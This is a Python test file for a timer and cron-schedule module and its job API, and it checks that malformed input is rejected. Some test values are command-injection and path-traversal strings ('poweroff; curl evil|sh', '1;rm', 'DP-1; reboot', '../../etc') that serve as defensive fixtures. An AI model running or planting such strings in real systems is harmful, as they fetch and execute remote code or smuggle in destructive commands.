"""Timers and the cron schedule evaluator."""
from datetime import datetime

import pytest

from unitotem_node.models.timers import Timer, TimerManager


def at(text):
    return datetime.strptime(text, '%Y-%m-%d %H:%M')


def T(minute='0', hour='3', dom='*', month='*', dow='*', **kw):
    return Timer(action='reb', minute=minute, hour=hour, day_of_month=dom, month=month, day_of_week=dow, **kw)


def test_daily_schedule_with_wildcards():
    t = T('0', '22')
    assert t.matches(at('2026-10-12 22:00'))
    assert not t.matches(at('2026-10-12 22:01'))


def test_step_range_and_list():
    t = T('*/15', '6-8', dow='1,3')
    assert t.matches(at('2026-10-12 07:45'))        # a Monday
    assert not t.matches(at('2026-10-13 07:00'))    # a Tuesday


@pytest.mark.parametrize('fields', [
    ('60', '*', '*', '*', '*'), ('*', '24', '*', '*', '*'), ('*', '*', '0', '*', '*'), ('*', '*', '*', '13', '*'),
    ('*/0', '*', '*', '*', '*'), ('a', '*', '*', '*', '*'),
    ('', '*', '*', '*', '*'), ('1;rm', '*', '*', '*', '*'), ('1 2', '*', '*', '*', '*'),
])
def test_invalid_schedules_are_refused(fields):
    with pytest.raises(ValueError):
        T(*fields)


def test_timer_refuses_unknown_action_and_free_form_commands():
    with pytest.raises(ValueError):
        Timer(action='poweroff; curl evil|sh', minute='0', hour='1', day_of_month='*', month='*', day_of_week='*')


def test_screen_timer_needs_an_output_name():
    with pytest.raises(ValueError):
        Timer(action='scr_off', minute='0', hour='1', day_of_month='*', month='*', day_of_week='*')
    with pytest.raises(ValueError):
        Timer(action='scr_off', output='DP-1; reboot', minute='0', hour='1', day_of_month='*', month='*',
              day_of_week='*')
    assert Timer(action='scr_off', output='DP-1', minute='0', hour='1', day_of_month='*', month='*',
                 day_of_week='*').serialize()['output'] == 'DP-1'


def test_old_clients_send_numbers():
    t = Timer(action='reb', minute=0, hour=3, day_of_month='*', month='*', day_of_week='*')
    assert (t.minute, t.hour) == ('0', '3')


def test_due_only_lists_enabled_matching_timers():
    m = TimerManager()
    a = Timer(action='reb', minute='0', hour='3', day_of_month='*', month='*', day_of_week='*')
    b = Timer(action='pwr', minute='0', hour='3', day_of_month='*', month='*', day_of_week='*', enabled=False)
    m.timers = {a.uuid: a, b.uuid: b}
    assert m.due(at('2026-10-12 03:00')) == [a]
    assert m.due(at('2026-10-12 03:01')) == []


def _timers_api(monkeypatch, tmp_path):
    from unitotem_node.api import timers as api
    manager = TimerManager()
    monkeypatch.setattr(TimerManager, '_filepath', staticmethod(lambda: tmp_path / 'timers.json'))
    monkeypatch.setattr(api, 'timer_manager', manager)
    return api.Timers(None, None), manager


def _run(gen_or_value):
    import asyncio
    import inspect
    if inspect.isasyncgen(gen_or_value):
        async def collect():
            return [item async for item in gen_or_value]
        return asyncio.run(collect())
    return [gen_or_value]


def test_delete_job_refuses_a_malformed_or_unknown_id(monkeypatch, tmp_path):
    api, manager = _timers_api(monkeypatch, tmp_path)
    t = manager.add(T('0', '3'))
    assert api.delete_job('../../etc').kwargs['error'] == 'Invalid job'
    assert api.delete_job('0' * 32).kwargs['error'] == 'Not found'
    assert t.uuid in manager.timers                      # nothing was removed
    ok = api.delete_job(t.uuid)
    assert 'error' not in ok.kwargs and t.uuid not in manager.timers


def test_edit_job_clears_output_and_wake_with_an_empty_string(monkeypatch, tmp_path):
    api, manager = _timers_api(monkeypatch, tmp_path)
    sus = manager.add(Timer(action='sus', minute='0', hour='22', day_of_month='*', month='*', day_of_week='*',
                            wake='0 7 * * *'))
    [resp] = _run(api.edit_job(sus.uuid, command='reb', wake=''))
    assert manager.timers[sus.uuid].wake is None
    assert manager.timers[sus.uuid].action == 'reb'
    scr = manager.add(Timer(action='scr_off', output='DP-1', minute='0', hour='1', day_of_month='*', month='*',
                            day_of_week='*'))
    [resp] = _run(api.edit_job(scr.uuid, output=''))
    assert resp.kwargs.get('error') == 'Invalid timer'   # a screen timer keeps its output
    assert manager.timers[scr.uuid].output == 'DP-1'


def test_edit_job_without_the_field_keeps_it(monkeypatch, tmp_path):
    api, manager = _timers_api(monkeypatch, tmp_path)
    scr = manager.add(Timer(action='scr_on', output='DP-1', minute='0', hour='1', day_of_month='*', month='*',
                            day_of_week='*'))
    _run(api.edit_job(scr.uuid, minute='5'))
    assert manager.timers[scr.uuid].output == 'DP-1' and manager.timers[scr.uuid].minute == '5'
